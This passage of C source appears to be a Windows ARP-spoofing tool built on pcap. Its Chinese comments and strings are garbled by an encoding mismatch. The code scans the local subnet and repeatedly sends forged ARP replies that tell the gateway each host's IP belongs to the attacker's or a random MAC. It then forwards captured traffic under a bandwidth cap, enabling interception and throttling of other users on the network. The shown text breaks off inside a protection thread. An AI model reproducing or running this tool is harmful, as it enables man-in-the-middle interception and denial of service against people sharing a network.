#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <pcap.h>
#include <conio.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <time.h>

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"pcap.lib")

#define THREADS_MAXIMUM 1000

const char *about_str=\
                      "\n"
                      "\t-------------------------------------------------------------\n"
                      "\t+                                                           +\n"
                      "\t+                   ���������٣�Ver 2.3��                   +\n"
                      "\t+                                                           +\n"
                      "\t+                                                           +\n"
                      "\t+          ������ѧ־ͬ���ϵĻ��� ���� AND С��             +\n"
                      "\t+                                                           +\n"
                      "\t+                                             2016.6.21     +\n"
                      "\t+                                             By:Wayne      +\n"
                      "\t-------------------------------------------------------------\n";

const char *config_format=\
                          "[ϵͳ����]\n"
                          "����ģʽ=1\t\t#1.������  2.������\n"
                          "����ģʽ=1\t\t#1.����    2.�㲥�����\n"
                          "Ӧ��ģʽ=1\t\t#1.����    2.����\n"
                          "����ģʽ=0\t\t#0.��      1.�ǣ����ԴMAC��ַ��\n"
                          "����������=100\t\t#��λ��Kb/s\n"
                          "Ӧ����=1000\t\t#��λ��ms\n"
                          "�������=300\t\t#��λ��s\n"
                          "[�����б�]\n";

typedef struct _System_Config_
{
    int confineMode;   //����ģʽ
    int sceneMode;     //����ģʽ
    int respondMode;   //Ӧ��ģʽ
    int interval;      //Ӧ����
    int messInterval;  //ȫ�����Ҽ��
    int randMAC;       //���MAC
    int totalSpeed;    //������

    char myIPAddress[16];
    unsigned char myMAC[6];
    char gatewayIp[16];
    unsigned char gatewayMAC[6];
    char mask[16];

    pcap_t *hpcap;
} SYS_CON;

typedef struct _Host_Info_
{
    char ip[16];
    unsigned char mac[6];
    int timestamp;
    int alive;
    struct _Host_Info_ *next;
} HOST_INFO;

SYS_CON gl_Sys_Con;
HOST_INFO *glp_Host_List_Header=NULL;
HOST_INFO *glp_custom_List_Header=NULL;
CRITICAL_SECTION cs_flowSpeed;
CRITICAL_SECTION cs_arpCount;
CRITICAL_SECTION cs_threadCount;
unsigned long int arpPacketCount=0;
unsigned long int flowPacketCount=0;
unsigned long int subHostCount=0;
unsigned long int macScanCount=0;
unsigned long int threadCount=0;
double flowSpeed=0;
double recordFlowSpeed=0;
double totalFlowSize=0;

typedef struct DLC_Header
{
    unsigned char DesMAC[6];     //��̫��Ŀ�ĵ�ַ
    unsigned char SrcMAC[6];     //��̫��Դ��ַ
    unsigned short EtherType;    //֡����
} DLCHEADER;

typedef struct ARP_Frame
{
    unsigned short HW_Type;       //Ӳ������
    unsigned short Prot_Type;     //�ϲ�Э������
    unsigned char HW_Addr_Len;    //MAC��ַ����
    unsigned char Prot_Addr_Len;  //IP��ַ����
    unsigned short Opcode;        //������,01��ʾ����02��ʾӦ��

    unsigned char Send_HW_Addr[6]; //���Ͷ�MAC��ַ
    unsigned char Send_Prot_Addr[4];   //���Ͷ�IP��ַ
    unsigned char Targ_HW_Addr[6]; //Ŀ��MAC��ַ
    unsigned char Targ_Prot_Addr[4];   //Ŀ��IP��ַ
} ARPFRAME;

typedef struct ipheader
{
    unsigned char ip_hl:4;         /*header length(��ͷ���ȣ�*/
    unsigned char ip_v:4;          /*version(�汾)*/
    unsigned char ip_tos;          /*type os service��������*/
    unsigned short int ip_len;     /*total length (�ܳ���)*/
    unsigned short int ip_id;      /*identification (��ʶ��)*/
    unsigned short int ip_off;     /*fragment offset field(����λ��)*/
    unsigned char ip_ttl;          /*time to live (����ʱ��)*/
    unsigned char ip_p;            /*protocol(Э��)*/
    unsigned short int ip_sum;     /*checksum(У���)*/
    unsigned char ip_src[4];       /*source address(Դ��ַ)*/
    unsigned char ip_dst[4];       /*destination address(Ŀ�ĵ�ַ)*/
} IP;

typedef struct tcpheader
{
    unsigned short int sport;    /*source port (Դ�˿ں�)*/
    unsigned short int dport;    /*destination port(Ŀ�Ķ˿ں�)*/
    unsigned int th_seq;         /*sequence number(�������к�)*/
    unsigned int th_ack;         /*acknowledgement number(ȷ��Ӧ���)*/
    unsigned char th_x:4;        /*unused(δʹ��)*/
    unsigned char th_off:4;      /*data offset(����ƫ����)*/
    unsigned char Flags;         /*��־ȫ*/
    unsigned short int th_win;   /*windows(����)*/
    unsigned short int th_sum;   /*checksum(У���)*/
    unsigned short int th_urp;   /*urgent pointer(����ָ��)*/
} TCP;

BOOL GetAdapterInfo(char *ipbuff,char *macbuff,char *gatewayIp)
{
    IP_ADAPTER_INFO AdapterInfo[16];  //����洢������Ϣ�Ľṹ����
    DWORD ArrayLength=sizeof(AdapterInfo);  //����������

    memset(gatewayIp,NULL,16);

    if(GetAdaptersInfo(AdapterInfo,&ArrayLength)!=ERROR_SUCCESS)
        return ERROR;
    PIP_ADAPTER_INFO PAdapterInfo=AdapterInfo;

    do
    {
        if(!strcmp(ipbuff,PAdapterInfo->IpAddressList.IpAddress.String)) break; //�ҵ���Ӧ����
        PAdapterInfo=PAdapterInfo->Next;
    }
    while(PAdapterInfo);
    if(PAdapterInfo==NULL)
    {
        printf("δ�ҵ���Ӧ����IP!\n");
        getch();
        exit(0);
    }
    memset(macbuff,NULL,6);
    memcpy(macbuff,PAdapterInfo->Address,6);         //��ȡ����MAC��ַ
    strcat(gatewayIp,PAdapterInfo->GatewayList.IpAddress.String);

    return TRUE;
}

char *iptos(u_long in)
{
    static char output[12][3*4+3+1];
    static short which;
    u_char *p;

    p = (u_char *)&in;
    which = (which + 1 == 12 ? 0 : which + 1);
    sprintf(output[which], "%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
    return output[which];
}

BOOL ChooseDev(char *devbuff,int buffsize,char *ipbuff)
{
    pcap_if_t *alldevs=NULL,*d=NULL;
    char errbuf[PCAP_ERRBUF_SIZE+1];
    char source[PCAP_ERRBUF_SIZE+1];
    int i,choose;
    pcap_addr_t *a=NULL;

    memset(devbuff,NULL,buffsize);
    memset(ipbuff,NULL,16);
    memset(source,NULL,sizeof(source));
    memset(errbuf,NULL,sizeof(errbuf));

    strcat(source,"1");
    source[PCAP_ERRBUF_SIZE]='\0';

    if(pcap_findalldevs_ex(source,NULL,&alldevs,errbuf) == -1)
    {
        fprintf(stderr,"error in pcap_findalldevs_ex.\n",errbuf);
        exit(1);
    }
    for(d=alldevs,i=1; d!=NULL; d=d->next,i++)
    {
        //�豸��
        printf("%d:%s\n",i,d->name);

        //�豸����
        if(d->description)
            printf("Description: %s\n",d->description);
        //loopback address
        printf("Loopback: %s\n",(d->flags & PCAP_IF_LOOPBACK)?"yes":"no");

        //IP address
        for(a=d->addresses; a!=NULL; a=a->next)
        {
            printf("Address Family: #%d\n",a->addr->sa_family);

            switch(a->addr->sa_family)
            {
            case AF_INET:
                printf("Address Family Name: AF_INET.\n");
                if (a->addr)
                    printf("Address: %s\n",iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr));
                if (a->netmask)
                    printf("Netmask: %s\n",iptos(((struct sockaddr_in *)a->netmask)->sin_addr.s_addr));
                if (a->broadaddr)
                    printf("Broadcast Address: %s\n",iptos(((struct sockaddr_in *)a->broadaddr)->sin_addr.s_addr));
                if (a->dstaddr)
                    printf("Destination Address: %s\n",iptos(((struct sockaddr_in *)a->dstaddr)->sin_addr.s_addr));
                break;
            case AF_INET6:
                printf("Address Family Name: AF_INET6\n");
                break;
            default:
                printf("Address Family Name: Unknown\n");
                break;
            }
        }
        printf("------------------------------------------------------\n");
    }

    do
    {
        printf("��ѡ��һ������:");
        fflush(stdin);
    }
    while(scanf("%d",&choose)!=1 || choose<1 ||choose>i);

    for(d=alldevs,i=1; i<choose; d=d->next,i++);
    for(a=d->addresses; a!=NULL; a=a->next)
    {
        if(a->addr && a->addr->sa_family==AF_INET)
        {
            strcat(devbuff,d->name);
            strcat(ipbuff,iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr));
            strcat(gl_Sys_Con.mask,iptos(((struct sockaddr_in *)a->netmask)->sin_addr.s_addr));
        }
    }
    pcap_freealldevs(alldevs);

    return TRUE;
}

int rand_mac_addr(char *pmac)
{
    int i;

    memset(pmac,NULL,6);

    for(i=0; i<6; i++)
    {
        pmac[i]=rand()%255;
    }

    return 0;
}

void Fill_ARPPACKET(char *ARPPacket,int packetsize,char *desmac,char *desIP,char *srcmac,char *srcip,int op)
{
    /*
        *ARPPacket    ָ��Ҫ�������ݰ�ָ��
         packetsize   ���ݰ���С
        *desmac ָ�����Ŀ��MAC�Ļ�������ַ
        *desIP  ָ�����Ŀ��IP�Ļ�������ַ
        *srcmac ָ�������ԴMAC�Ļ�������ַ
        *srcip  ָ�������ԴIP�Ļ�������ַ
         op     ARP������
        */
    unsigned long tmpIp;
    DLCHEADER *DLCHeader=(DLCHEADER *)ARPPacket;
    ARPFRAME *ARPFrame=(ARPFRAME *)(ARPPacket+sizeof(DLCHEADER));

    memset(ARPPacket,NULL,packetsize);  //��հ�����

//�����̫��Ŀ�ĵ�ַ
    if(op==1)    //��ʾARP�����.
    {
        memset(DLCHeader->DesMAC,0xff,6);    //��ffffffffffff�����̫��ͷĿ��MAC��ַ��
        tmpIp=inet_addr(desIP);
        memcpy(ARPFrame->Targ_Prot_Addr,(char *)&tmpIp,4);
    }
    else
    {
        memcpy(DLCHeader->DesMAC,desmac,6);
        tmpIp=inet_addr(desIP);
        memcpy(ARPFrame->Targ_Prot_Addr,(char *)&tmpIp,4);
        memcpy(ARPFrame->Targ_HW_Addr,DLCHeader->DesMAC,6);
    }

    //�����̫��Դ��ַ
    memcpy(DLCHeader->SrcMAC,gl_Sys_Con.myMAC,6);
    memcpy(ARPFrame->Send_HW_Addr,srcmac,6);
    //���ARP��ԴIP
    tmpIp=inet_addr(srcip);
    memcpy(ARPFrame->Send_Prot_Addr,(char *)&tmpIp,4);
    DLCHeader->EtherType=htons((unsigned short)0x0806);    //0x0806��ʾARPЭ�飬0x0800��ʾIPЭ��
    ARPFrame->HW_Addr_Len=(unsigned char)6;
    ARPFrame->Prot_Addr_Len=(unsigned char)4;
    ARPFrame->HW_Type=htons((unsigned short)1);
    ARPFrame->Opcode=htons((unsigned short)op);   //01��ʾ����02��ʾӦ��
    ARPFrame->Prot_Type=htons((unsigned short)0x0800);

    return;
}

int print_lock=0;

int bind_arp_list()
{
    FILE *cmdRes=NULL;
    int idx=-1;
    char result[2000];
    char *p1=NULL,*p2=NULL;

    system("arp -d");
    cmdRes=popen("netsh interface ipv4 show neighbors","r");
    while(!feof(cmdRes))
    {
        memset(result,NULL,sizeof(result));
        fgets(result,sizeof(result)-1,cmdRes);
        p2=strchr(result,':');
        if(p2!=NULL)
        {
            p1=p2;
            for(p1--; *p1>='0' && *p1<='9'; p1--);
            p1++;
            *p2=NULL;
            idx=atoi(p1);
        }
        p1=strstr(result,gl_Sys_Con.gatewayIp);
        if(p1!=NULL)
        {
            sprintf(result,"netsh interface ipv4 set neighbors %d \"%s\" \"%02x-%02x-%02x-%02x-%02x-%02x\" store=active",idx,\
                    gl_Sys_Con.gatewayIp,gl_Sys_Con.gatewayMAC[0],gl_Sys_Con.gatewayMAC[1],gl_Sys_Con.gatewayMAC[2],\
                    gl_Sys_Con.gatewayMAC[3],gl_Sys_Con.gatewayMAC[4],gl_Sys_Con.gatewayMAC[5]);
            system(result);
            pclose(cmdRes);

            cmdRes=popen(result,"r");
            memset(result,NULL,sizeof(result)-1);
            fgets(result,sizeof(result)-1,cmdRes);
            if(strlen(result)>5)
            {
                puts("���Թ���ԱȨ�����д˳���\n");
                print_lock=1;
                getch();
                exit(0);

            }
            pclose(cmdRes);

            return 0;
        }
    }
    pclose(cmdRes);

    return 0;
}

DWORD WINAPI respond_arp_thread(LPVOID para)
{
    int i,n;
    char ARPPacket[60];
    char *pIp=(char *)para;
    char srcMAC[6];

    for(i=1,n=0; n<20; n++)
    {
        if(!memory_empty(gl_Sys_Con.gatewayMAC,sizeof(gl_Sys_Con.gatewayMAC)))
        {
            memset(ARPPacket,NULL,sizeof(ARPPacket));
            memset(srcMAC,NULL,sizeof(srcMAC));
            if(gl_Sys_Con.randMAC)
            {
                rand_mac_addr(srcMAC);
            }
            else
            {
                memcpy(srcMAC,gl_Sys_Con.myMAC,6);
            }
            Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),gl_Sys_Con.gatewayMAC,gl_Sys_Con.gatewayIp,\
                           srcMAC,pIp,2);
            SendPacket(gl_Sys_Con.hpcap,ARPPacket,sizeof(ARPPacket));
            EnterCriticalSection(&cs_arpCount);
            arpPacketCount++;
            LeaveCriticalSection(&cs_arpCount);
        }
        Sleep(1);
    }

    free(para);
    EnterCriticalSection(&cs_threadCount);
    threadCount--;
    LeaveCriticalSection(&cs_threadCount);

    return 0;
}

int deal_packet(u_char *param,const struct pcap_pkthdr *pkthdr,const u_char *pkt_data)
{
    int i;
    char *Packet=NULL;
    char tmpIp[16];
    char *pIp=NULL;
    DLCHEADER *DLCHeader=NULL;
    IP *IPHeader=NULL;
    ARPFRAME *ARPHeader=NULL;
    HOST_INFO *pNode=NULL;

    Packet=pkt_data;

    if(pkthdr->caplen<sizeof(DLCHEADER)) return -1;
    DLCHeader=(DLCHEADER *)Packet;

    if(strncmp(DLCHeader->DesMAC,gl_Sys_Con.myMAC,6))
    {
        //���Ƿ�������MAC
        //����Ƿ��ǹ㲥��ַ
        for(i=0; i<6; i++)
        {
            if(DLCHeader->DesMAC[i]!=0xff)
            {
                return 0;
            }
        }
    }

    if(!strncmp(DLCHeader->SrcMAC,gl_Sys_Con.myMAC,6))
    {
        //�������ͳ�ȥ��
        return 0;
    }

    //printf("%d %d\n",pkthdr->caplen,pkthdr->len);

    if(ntohs(DLCHeader->EtherType)==0x0806)
    {
        //���յ�ARPЭ���
        if(pkthdr->caplen<sizeof(DLCHEADER)+sizeof(ARPFRAME)) return -1;
        ARPHeader=(ARPFRAME *)(Packet+sizeof(DLCHEADER));

        if(ARPHeader->Opcode==htons(2))
        {
            //���յ�Ӧ���
            memset(tmpIp,NULL,sizeof(tmpIp));
            strcat(tmpIp,inet_ntoa(*(struct in_addr *)ARPHeader->Send_Prot_Addr));  //����ԴIP
            if(!strcmp(tmpIp,gl_Sys_Con.gatewayIp))
            {
                //���յ�����MAC��ַ
                if(memory_empty(gl_Sys_Con.gatewayMAC,sizeof(gl_Sys_Con.gatewayMAC)))
                {
                    memcpy(gl_Sys_Con.gatewayMAC,ARPHeader->Send_HW_Addr,6);
                    bind_arp_list();
                }
                return 0;
            }

            for(pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
            {
                if(!strcmp(tmpIp,pNode->ip))
                {
                    //���������е�ARP��Ӧ��
                    pNode->alive=1;
                    memcpy(pNode->mac,ARPHeader->Send_HW_Addr,6);
                    pNode->timestamp=time(NULL);
                    return 0;
                }
            }
        }
        else
        {
            //���յ�ARP�����
            if(!strncmp(gl_Sys_Con.gatewayMAC,ARPHeader->Send_HW_Addr,6))
            {
                //���������ص�����
                pIp=(char *)malloc(16);
                if(pIp==NULL) return -1;
                memset(pIp,NULL,16);
                //�������IP
                strcat(pIp,inet_ntoa(*(struct in_addr *)ARPHeader->Targ_Prot_Addr));

                for(pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
                {
                    if(!strcmp(pIp,pNode->ip))
                    {
                        pNode->timestamp=time(NULL);
                        pNode->alive=1;
                        break;
                    }
                }
                if(pNode!=NULL)
                {
                    //Ӧ�������
                    EnterCriticalSection(&cs_threadCount);
                    if(threadCount<THREADS_MAXIMUM)
                    {
                        CloseHandle(CreateThread(NULL,0,respond_arp_thread,(LPVOID)pIp,0,NULL));
                        threadCount++;
                    }
                    else
                    {
                        free(pIp);
                    }
                    LeaveCriticalSection(&cs_threadCount);
                    //puts(pIp);
                }
                else
                {
                    free(pIp);
                }
            }
            else
            {
                //������������������
                memset(tmpIp,NULL,sizeof(tmpIp));
                strcat(tmpIp,inet_ntoa(*(struct in_addr *)ARPHeader->Send_Prot_Addr));  //����ԴIP

                for(pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
                {
                    if(!strcmp(tmpIp,pNode->ip))
                    {
                        pNode->timestamp=time(NULL);
                        pNode->alive=1;
                        memcpy(pNode->mac,ARPHeader->Send_HW_Addr,6);
                        break;
                    }
                }
            }
        }
    }
    else if(ntohs(DLCHeader->EtherType)==0x0800)
    {
        //���յ�IP���ݰ�
        if(pkthdr->caplen<sizeof(DLCHEADER)+sizeof(IP)) return -1;

        IPHeader=(IP *)(Packet+sizeof(DLCHEADER));
        memset(tmpIp,NULL,sizeof(tmpIp));
        strcat(tmpIp,inet_ntoa(*(struct in_addr *)IPHeader->ip_dst));
        if(strcmp(tmpIp,gl_Sys_Con.myIPAddress))
        {
            //Ŀ��IP���Ǳ���
            //��ƭ��������������Ҫת��
            ++flowPacketCount;
            if((int)flowSpeed<gl_Sys_Con.totalSpeed*1024)
            {
                for(pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
                {
                    if(!strcmp(tmpIp,pNode->ip) && !memory_empty(pNode->mac,6))
                    {
                        //�ҵ�ת����Ӧ��
                        memcpy(DLCHeader->SrcMAC,gl_Sys_Con.myMAC,6);
                        memcpy(DLCHeader->DesMAC,pNode->mac,6);
                        SendPacket(gl_Sys_Con.hpcap,Packet,pkthdr->caplen);
                        EnterCriticalSection(&cs_flowSpeed);
                        flowSpeed+=pkthdr->caplen;
                        LeaveCriticalSection(&cs_flowSpeed);
                        totalFlowSize+=pkthdr->caplen;
                        //printf("ת������:%d\tTo:%s\tMAC:%02x-%02x-%02x-%02x-%02x-%02x\tmyMAC:%02x-%02x-%02x-%02x-%02x-%02x\n",pkthdr->caplen,tmpIp,\
                        pNode->mac[0],pNode->mac[1],pNode->mac[2],pNode->mac[3],pNode->mac[4],pNode->mac[5],\
                        gl_Sys_Con.myMAC[0],gl_Sys_Con.myMAC[1],gl_Sys_Con.myMAC[2],gl_Sys_Con.myMAC[3],gl_Sys_Con.myMAC[4],\
                        gl_Sys_Con.myMAC[5]);
                        break;
                    }
                }
            }
        }
    }

    return 0;
}

int sniffer()
{
    pcap_loop(gl_Sys_Con.hpcap,-1,deal_packet,NULL);

    return 0;
}

BOOL SendPacket(pcap_t *hpcap,char *Packet,int packetsize)
{
    if(pcap_sendpacket(hpcap,Packet,packetsize)!=0)
    {
        printf("���ݰ�����ʧ�ܡ�\n");
        return ERROR;
    }
    return TRUE;
}


pcap_t *OpenAdapter(char *devName)
{
    pcap_t *hpcap=NULL;
    char errbuf[PCAP_ERRBUF_SIZE];

    if((hpcap=pcap_open_live(devName,        // �豸��
                             65536,          // ָ��Ҫ��׽�����ݰ��Ĳ���,65536 ��֤��������·���ϵİ����ܹ���ץ��
                             1,    		     // ����ģʽ
                             0,         	 // �����ݵĳ�ʱʱ��
                             errbuf          // ���󻺳���
                            ))==NULL)
    {
        printf("����������\n");
        return NULL;
    }

    return hpcap;
}

int create_configure_file()
{
    FILE *file=NULL;

    file=fopen("config.ini","w");
    if(file==NULL)
    {
        printf("����'config.ini'�ļ�ʧ�ܣ�\n");
        getch();
        return -1;
    }
    fputs(config_format,file);
    fflush(file);
    fclose(file);

    return 0;
}

int about()
{
    char choose;

    system("color a");
    printf("%s\n",about_str);
    printf("\n1.��ʼ����    2.�༭�����ļ�    3.���������ļ�\n");
reselect:
    fflush(stdin);
    choose=getch();
    switch(choose)
    {
    case '1':
        break;
    case '2':
        if(access("config.ini",0)!=0)
        {
            if(create_configure_file()!=0)
            {
                exit(-1);
            }
        }
        system("config.ini");
        goto reselect;
        break;
    case '3':
        if(create_configure_file()!=0)
        {
            printf("���������ļ�ʧ�ܣ�\n");
            getch();
            exit(0);
        }
        printf("�����������ļ�'config.ini'\n");
        goto reselect;
        break;
    default:
        goto reselect;
    }

    return 0;
}

int init_config()
{
    FILE *file=NULL;
    char readBuf[1000];
    char title[1000];
    char *p1=NULL,*p2=NULL;
    HOST_INFO *pNode=NULL,*pNew=NULL;

    memset(&gl_Sys_Con,NULL,sizeof(gl_Sys_Con));

    if(access("config.ini",0)!=0)
    {
        printf("�����ļ������ڣ�����ѡ�����ɣ�\n");
        getch();
        exit(-1);
    }
    file=fopen("config.ini","r");
    if(file==NULL)
    {
        return -1;
    }
    while(!feof(file))
    {
        memset(readBuf,NULL,sizeof(readBuf));
        fgets(readBuf,sizeof(readBuf)-1,file);
        if(readBuf[0]=='[')
        {
            memset(title,NULL,sizeof(title));
            strncat(title,&readBuf[1],strlen(readBuf)-3);
        }
        else if(!strcmp("ϵͳ����",title))
        {
            p1=strchr(readBuf,'=');
            if(!strncmp("����ģʽ",readBuf,p1-readBuf))
            {
                p1++;
                p2=strchr(p1,'\t');
                if(p2==NULL || p1==p2) return -1;
                *p2=NULL;
                gl_Sys_Con.confineMode=atoi(p1);
            }
            else if(!strncmp("����ģʽ",readBuf,p1-readBuf))
            {
                p1++;
                p2=strchr(p1,'\t');
                if(p2==NULL || p1==p2) return -1;
                *p2=NULL;
                gl_Sys_Con.sceneMode=atoi(p1);
            }
            else if(!strncmp("Ӧ��ģʽ",readBuf,p1-readBuf))
            {
                p1++;
                p2=strchr(p1,'\t');
                if(p2==NULL || p1==p2) return -1;
                *p2=NULL;
                gl_Sys_Con.respondMode=atoi(p1);
            }
            else if(!strncmp("����ģʽ",readBuf,p1-readBuf))
            {
                p1++;
                p2=strchr(p1,'\t');
                if(p2==NULL || p1==p2) return -1;
                *p2=NULL;
                gl_Sys_Con.randMAC=atoi(p1);
            }
            else if(!strncmp("Ӧ����",readBuf,p1-readBuf))
            {
                p1++;
                p2=strchr(p1,'\t');
                if(p2==NULL || p1==p2) return -1;
                *p2=NULL;
                gl_Sys_Con.interval=atoi(p1);
            }
            else if(!strncmp("�������",readBuf,p1-readBuf))
            {
                p1++;
                p2=strchr(p1,'\t');
                if(p2==NULL || p1==p2) return -1;
                *p2=NULL;
                gl_Sys_Con.messInterval=atoi(p1);
            }
            else if(!strncmp("����������",readBuf,p1-readBuf))
            {
                p1++;
                p2=strchr(p1,'\t');
                if(p2==NULL || p1==p2) return -1;
                *p2=NULL;
                gl_Sys_Con.totalSpeed=atoi(p1);
            }
        }
        else if(!strcmp("�����б�",title))
        {
            if(readBuf[strlen(readBuf)-1]=='\n')
                readBuf[strlen(readBuf)-1]=NULL;
            if(strlen(readBuf)<5) continue;
            pNew=(HOST_INFO *)malloc(sizeof(HOST_INFO));
            if(pNew==NULL) return -1;
            memset(pNew,NULL,sizeof(HOST_INFO));

            strcat(pNew->ip,readBuf);
            if(glp_custom_List_Header==NULL)
            {
                glp_custom_List_Header=pNew;
            }
            else
            {
                for(pNode=glp_custom_List_Header; pNode->next!=NULL; pNode=pNode->next);
                pNode->next=pNew;
            }
        }
    }
    fclose(file);

    return 0;
}

/*���������������Ƿ�ƥ�䣬Ҳ�ɲ�����������IP�Ƿ���ͬһ������*/
int netIPAndSubnetValid(char *strIp,char *strSubip,char *strMask)
{
    int addr1,addr2;
    unsigned int IP,subIP,mask;

    IP=inet_addr(strIp);
    subIP=inet_addr(strSubip);
    mask=inet_addr(strMask);

    addr1=IP & mask;
    addr2=subIP & mask;

    if(addr1!=addr2)
        return 0;

    return 1;
}

int init_host_list()
{
    char ipPrefix[16],ip[16];
    char *p=NULL;
    int i,j,writeList=0;
    int tmpIndex[4];
    HOST_INFO *pNode=NULL,*pNode2=NULL;

    memset(ipPrefix,NULL,sizeof(ipPrefix));

    strcat(ipPrefix,gl_Sys_Con.myIPAddress);
    p=strrchr(ipPrefix,'.');
    if(p==NULL) return -1;
    *p=NULL;
    p=strrchr(ipPrefix,'.');
    *p=NULL;

    if(gl_Sys_Con.confineMode==1)
    {
        //������ģʽ
        for(tmpIndex[2]=0; tmpIndex[2]<=255; tmpIndex[2]++)
            for(tmpIndex[3]=1; tmpIndex[3]<255; tmpIndex[3]++)
            {
                memset(ip,NULL,sizeof(ip));

                //������IP��ַ
                sprintf(ip,"%s.%d.%d",ipPrefix,tmpIndex[2],tmpIndex[3]);

                //�Ƿ�ͱ�������ͬһ����
                if(!netIPAndSubnetValid(ip,gl_Sys_Con.myIPAddress,gl_Sys_Con.mask))
                {
                    continue;
                }
                subHostCount++;

                //����ǲ������ػ򱾻�IP
                if(!strcmp(ip,gl_Sys_Con.gatewayIp) || !strcmp(ip,gl_Sys_Con.myIPAddress))
                {
                    continue;
                }

                //����ǲ��ǰ�����IP
                for(pNode2=glp_custom_List_Header,writeList=0; pNode2!=NULL; pNode2=pNode2->next)
                {
                    if(!strcmp(ip,pNode2->ip))
                    {
                        writeList=1;
                        break;
                    }
                    else
                    {
                        writeList=0;
                    }
                }
                if(writeList) continue;

                //���뵽̽���б���
                if(glp_Host_List_Header==NULL)
                {
                    glp_Host_List_Header=(HOST_INFO *)malloc(sizeof(HOST_INFO));
                    if(glp_Host_List_Header==NULL) return -1;

                    pNode=glp_Host_List_Header;
                }
                else
                {
                    for(pNode=glp_Host_List_Header; pNode->next!=NULL; pNode=pNode->next);
                    pNode->next=(HOST_INFO *)malloc(sizeof(HOST_INFO));
                    if(pNode->next==NULL) return -1;

                    pNode=pNode->next;
                }
                memset(pNode,NULL,sizeof(HOST_INFO));
                strcat(pNode->ip,ip);
            }

    }
    else
    {
        glp_Host_List_Header=glp_custom_List_Header;
    }

    return 0;
}

DWORD WINAPI scan_host_mac_thread(LPVOID para)
{
    char ARPPacket[60];
    HOST_INFO *pNode=NULL;

    while(1)
    {
        if(memory_empty(gl_Sys_Con.gatewayMAC,6))
        {
            //ѯ������MAC
            memset(ARPPacket,NULL,sizeof(ARPPacket));
            Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),NULL,gl_Sys_Con.gatewayIp,gl_Sys_Con.myMAC,gl_Sys_Con.myIPAddress,1);
            SendPacket(gl_Sys_Con.hpcap,ARPPacket,sizeof(ARPPacket));
        }

        //ɨ��Ŀ������MAC
        for(pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
        {
            if(pNode->alive)
            {
                if(!memory_empty(pNode->mac,6) && time(NULL)-pNode->timestamp>60*5)
                {
                    //��Ӧ��������Ŀ����5����ʧЧ
                    memset(pNode->mac,NULL,6);
                    pNode->alive=0;
                }
                else if(memory_empty(pNode->mac,6) && time(NULL)-pNode->timestamp>60*10)
                {
                    //��Ӧ��������Ŀ10����ʧЧ
                    memset(pNode->mac,NULL,6);
                    pNode->alive=0;
                }
            }

            if(!(gl_Sys_Con.randMAC && gl_Sys_Con.sceneMode==2))
            {
                memset(ARPPacket,NULL,sizeof(ARPPacket));
                Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),NULL,pNode->ip,gl_Sys_Con.myMAC,gl_Sys_Con.myIPAddress,1);
                SendPacket(gl_Sys_Con.hpcap,ARPPacket,sizeof(ARPPacket));
                Sleep(2);
            }
        }
        macScanCount++;

        Sleep(5000);
    }

    return 0;
}

DWORD WINAPI flow_clear_thread(LPVOID para)
{
    while(1)
    {
        Sleep(1000);
        EnterCriticalSection(&cs_flowSpeed);
        recordFlowSpeed=flowSpeed;
        flowSpeed=0;
        LeaveCriticalSection(&cs_flowSpeed);
    }
    return 0;
}

int memory_empty(char *str,int size)
{
    int i;

    for(i=0; i<size; i++)
        if(str[i]!=NULL)
            return 0;

    return 1;
}

DWORD WINAPI arp_spoof_thread(LPVOID para)
{
    int i;
    HOST_INFO *pNode=NULL;
    char ARPPacket[60];
    int timestamp_1=0;
    clock_t timestamp_2=0;
    char srcMAC[6];

    while(memory_empty(gl_Sys_Con.gatewayMAC,sizeof(gl_Sys_Con.gatewayMAC))) Sleep(100);

    while(1)
    {
        if(time(NULL)-timestamp_1>gl_Sys_Con.messInterval)
        {
            //���Ҿ�����·�ɱ�
            for(pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
            {
                //���͸�����
                memset(ARPPacket,NULL,sizeof(ARPPacket));
                memset(srcMAC,NULL,sizeof(srcMAC));
                rand_mac_addr(srcMAC);

                Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),gl_Sys_Con.gatewayMAC,gl_Sys_Con.gatewayIp,\
                               srcMAC,pNode->ip,2);
                SendPacket(gl_Sys_Con.hpcap,ARPPacket,sizeof(ARPPacket));
                arpPacketCount++;
                Sleep(1);

                //�Թ㲥����ʽ���͸�����
                memset(ARPPacket,NULL,sizeof(ARPPacket));
                Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),NULL,pNode->ip,\
                               srcMAC,gl_Sys_Con.gatewayIp,1);
                SendPacket(gl_Sys_Con.hpcap,ARPPacket,sizeof(ARPPacket));
                arpPacketCount++;
                Sleep(1);
            }
            timestamp_1=time(NULL);
        }

        //��ƭ����
        if(clock()-timestamp_2>gl_Sys_Con.interval)
        {
            for(pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
            {
                if(gl_Sys_Con.sceneMode==2 || pNode->alive)
                {
                    //����ƭ
                    memset(ARPPacket,NULL,sizeof(ARPPacket));
                    memset(srcMAC,NULL,sizeof(srcMAC));
                    if(gl_Sys_Con.randMAC)
                    {
                        rand_mac_addr(srcMAC);
                    }
                    else
                    {
                        memcpy(srcMAC,gl_Sys_Con.myMAC,6);
                    }
                    Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),gl_Sys_Con.gatewayMAC,gl_Sys_Con.gatewayIp,\
                                   srcMAC,pNode->ip,2);
                    SendPacket(gl_Sys_Con.hpcap,ARPPacket,sizeof(ARPPacket));
                    arpPacketCount++;
                    Sleep(1);
                }
            }
            timestamp_2=clock();
        }

        Sleep(1);
    }

    return 0;
}

DWORD WINAPI arp_protect_thread(LPVOID para)
{
    char ARPPacket[60];
    clock_t timestamp = 0;

    while(1)
    {
